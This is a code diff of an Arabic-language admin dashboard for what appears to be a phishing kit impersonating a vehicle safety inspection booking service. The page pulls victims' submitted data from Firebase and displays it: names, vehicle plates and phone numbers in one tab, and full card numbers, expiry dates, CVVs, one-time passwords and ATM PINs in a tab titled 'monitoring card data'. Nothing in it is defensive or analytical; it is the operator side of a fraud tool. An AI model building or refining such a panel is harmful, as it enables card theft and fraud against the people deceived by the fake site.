@@ -3,112 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم الاحترافية</title>
+    <title>لوحة التحكم - مركز سلامة المركبات</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
-        .navbar { background: #006C35; padding: 15px; display: flex; justify-content: center; gap: 10px; sticky; top: 0; z-index: 1000; }
-        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .nav-btn.active { background: white; color: #006C35; }
-        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; }
-        .container { padding: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
+        .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
+        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; font-size: 14px; }
+        .nav-btn.active { background: #ffffff; color: #1e7344; }
+        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; border-bottom: 2px solid #b8860b; }
+        .container { padding: 15px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
-        
-        /* قسم البيانات الشخصية (العملاء) */
-        .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
-        .customer-card { background: white; border-radius: 10px; padding: 20px; border-right: 10px solid #006C35; box-shadow: 0 2px 5px rgba(0,0,0,0.1); position: relative; }
-        .time-tag { position: absolute; left: 15px; top: 15px; background: #e8f5e9; color: #2e7d32; padding: 5px 10px; border-radius: 5px; font-size: 12px; }
-        
-        /* قسم البطاقات */
-        .operation-row { background: white; border-radius: 8px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; gap: 15px; border: 1px solid #ddd; flex-wrap: wrap; }
-        .box { padding: 10px; border-radius: 5px; font-weight: bold; font-size: 14px; }
-        .card-info { background: #fff9db; color: #856404; border: 1px solid #ffe066; }
-        .otp-info { background: #fff0f0; color: #c92a2a; border: 1px solid #ffc9c9; }
-        .btn-del { background: #fa5252; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
+
+        /* تنسيق كروت بيانات الحجز الشخصية */
+        .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
+        .customer-card { background: white; border-radius: 12px; padding: 20px; border-right: 8px solid #1e7344; box-shadow: 0 4px 10px rgba(0,0,0,0.05); position: relative; }
+        .time-tag { background: #e6f4ea; color: #1e7344; padding: 4px 8px; border-radius: 5px; font-size: 11px; font-weight: bold; position: absolute; left: 15px; top: 20px; }
+
+        /* تنسيق سطر بيانات البطاقات */
+        .operation-row { background: white; border-radius: 8px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; border: 1px solid #eee; overflow-x: auto; }
+        .name-tag { min-width: 140px; font-weight: bold; font-size: 14px; }
+        .box { padding: 8px 12px; border-radius: 6px; text-align: center; font-size: 13px; font-weight: bold; border: 1px solid transparent; white-space: nowrap; }
+        .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; min-width: 180px; }
+        .otp-box { background: #fff5f5; border-color: #ffdada; color: #a94442; min-width: 150px; }
+
+        .btn-delete { background: #dc3545; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; font-size: 12px; }
     </style>
 </head>
 <body>
 
-<div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> زائر</div>
+<div class="visitor-counter">
+    المتواجدون الآن في الموقع: <span id="onlineCount">0</span> زائر 🌐
+</div>
 
 <div class="navbar">
-    <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز (المركبات)</button>
-    <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
+    <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز والوثائق</button>
+    <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 مراقبة بيانات البطاقات</button>
 </div>
 
 <div class="container">
     <div id="bookingSection" class="tab-content active">
-        <div id="bookingGrid" class="booking-grid">
-            </div>
+        <div id="bookingGrid" class="booking-grid"></div>
     </div>
 
     <div id="cardsSection" class="tab-content">
-        <div id="paymentsContainer">
-            </div>
+        <div id="paymentsContainer"></div>
     </div>
 </div>
 
 <script>
+    // --- إعدادات Firebase (يجب أن تكون نفس الموجودة في صفحة العميل) ---
     const firebaseConfig = {
-        apiKey: "YOUR_API_KEY",
-        authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-        databaseURL: "YOUR_DATABASE_URL",
-        projectId: "YOUR_PROJECT_ID",
-        storageBucket: "YOUR_PROJECT_ID.appspot.com",
-        messagingSenderId: "YOUR_SENDER_ID",
-        appId: "YOUR_APP_ID"
+        apiKey: "AIzaSyAzXXXXXXXXXXXX_YOUR_API_KEY",
+        authDomain: "vsc-project.firebaseapp.com",
+        databaseURL: "https://vsc-project-default-rtdb.firebaseio.com/",
+        projectId: "vsc-project",
+        storageBucket: "vsc-project.appspot.com",
+        messagingSenderId: "1234567890",
+        appId: "1:1234567890:web:abcdef123456"
     };
     firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    const database = firebase.database();
 
     // تحديث عداد الزوار
-    db.ref('presence').on('value', s => document.getElementById('onlineCount').innerText = s.numChildren());
+    database.ref('visitors').on('value', (s) => {
+        document.getElementById('onlineCount').innerText = s.numChildren();
+    });
 
-    // عرض بيانات الحجز (المركبات)
-    db.ref('bookings').on('value', (snapshot) => {
+    // سحب وعرض بيانات الحجز (من مسار visitors)
+    database.ref('visitors').on('value', (snapshot) => {
         const grid = document.getElementById('bookingGrid');
         grid.innerHTML = '';
         snapshot.forEach((child) => {
-            const d = child.val();
-            grid.innerHTML += `
+            const val = child.val();
+            // تصفية البيانات التي تحتوي على اسم فقط
+            if(val.full_name) {
+                grid.innerHTML += `
                 <div class="customer-card">
-                    <span class="time-tag">وصلت الآن</span>
-                    <h3>${d.name || 'غير معروف'}</h3>
-                    <p>🚗 المركبة: ${d.vehicleType || '-'} (${d.vehicleNumber || '-'})</p>
-                    <p>📍 المنطقة: ${d.region || '-'} | المركز: ${d.center || '-'}</p>
-                    <p>📅 التاريخ: ${d.date || '-'} | الوقت: ${d.time || '-'}</p>
-                    <p>📞 الجوال: ${d.phone || '-'}</p>
-                    <button class="btn-del" onclick="deleteItem('bookings/${child.key}')">حذف</button>
+                    <span class="time-tag">نشط الآن</span>
+                    <h3>${val.full_name} 👤</h3>
+                    <p>🚗 المركبة: ${val.vehicle_type || '-'} (${val.plate_number || '-'})</p>
+                    <p>📍 الموقع: ${val.region || '-'} - ${val.center || '-'}</p>
+                    <p>📅 الموعد: ${val.appointment_date || '-'} | ${val.appointment_time || '-'}</p>
+                    <p>📱 الجوال: ${val.phone || '-'}</p>
+                    <button class="btn-delete" onclick="deleteData('visitors/${child.key}')">حذف البيانات</button>
                 </div>`;
+            }
         });
     });
 
-    // عرض بيانات البطاقات
-    db.ref('payments').on('value', (snapshot) => {
+    // سحب وعرض بيانات البطاقات (من مسار payments أو حسب ما ترسله صفحة الدفع)
+    database.ref('payments').on('value', (snapshot) => {
         const container = document.getElementById('paymentsContainer');
         container.innerHTML = '';
         snapshot.forEach((child) => {
-            const d = child.val();
+            const val = child.val();
             container.innerHTML += `
-                <div class="operation-row">
-                    <div style="min-width:120px"><b>${d.name || 'عميل'}</b></div>
-                    <div class="box card-info">💳 ${d.cardNumber || '----'} | ${d.exp || '--'} | ${d.cvv || '--'}</div>
-                    <div class="box otp-info">🔐 OTP: ${d.otp || '----'} | ATM: ${d.atm || '----'}</div>
-                    <button class="btn-del" onclick="deleteItem('payments/${child.key}')">حذف</button>
-                </div>`;
+            <div class="operation-row">
+                <div class="name-tag">${val.name || 'عميل مجهول'}</div>
+                <div class="box card-box">💳 ${val.cardNumber || '----'} | ${val.exp || '--/--'} | ${val.cvv || '---'}</div>
+                <div class="box otp-box">🔐 OTP: ${val.otp || '----'} | ATM: ${val.atm || '----'}</div>
+                <button class="btn-delete" onclick="deleteData('payments/${child.key}')">🗑</button>
+            </div>`;
         });
     });
 
-    function deleteItem(path) { if(confirm('متأكد؟')) db.ref(path).remove(); }
+    function deleteData(path) {
+        if(confirm('هل أنت متأكد من الحذف؟')) database.ref(path).remove();
+    }
 
     function openTab(evt, tabName) {
         var i, tabcontent, navbtns;
         tabcontent = document.getElementsByClassName("tab-content");
-        for (i = 0; i < tabcontent.length; i++) tabcontent[i].style.display = "none";
+        for (i = 0; i < tabcontent.length; i++) { tabcontent[i].style.display = "none"; }
         navbtns = document.getElementsByClassName("nav-btn");
-        for (i = 0; i < navbtns.length; i++) navbtns[i].className = "nav-btn";
+        for (i = 0; i < navbtns.length; i++) { navbtns[i].className = navbtns[i].className.replace(" active", ""); }
         document.getElementById(tabName).style.display = "block";
         evt.currentTarget.className += " active";
     }
